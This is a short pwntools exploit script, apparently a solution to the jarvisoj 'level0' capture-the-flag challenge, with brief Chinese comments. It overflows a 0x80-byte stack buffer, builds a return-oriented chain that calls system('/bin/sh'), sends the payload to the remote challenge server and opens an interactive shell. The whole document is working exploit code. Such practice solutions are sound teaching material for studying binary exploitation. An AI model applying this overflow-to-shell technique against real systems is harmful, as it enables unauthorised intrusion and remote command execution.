from pwn import *

elf     = ELF("./level0")

addr_pr = 0x400663                     # pop rdi ; ret ; | system 函数 传参 
addr_sys= elf.sym["system"]           
addr_sh = elf.search("/bin/sh").next() 
# p = process("./level0")                   # 本地测试函数 process
p = remote("pwn2.jarvisoj.com" , 9881)  # 远程链接函数 remote 类似 nc
p.recv() # clear
payload  = (0x80 + 8) * 'a' 
payload += p64(addr_pr) + p64(addr_sh) + p64(addr_sys)
p.send(payload)

p.interactive()     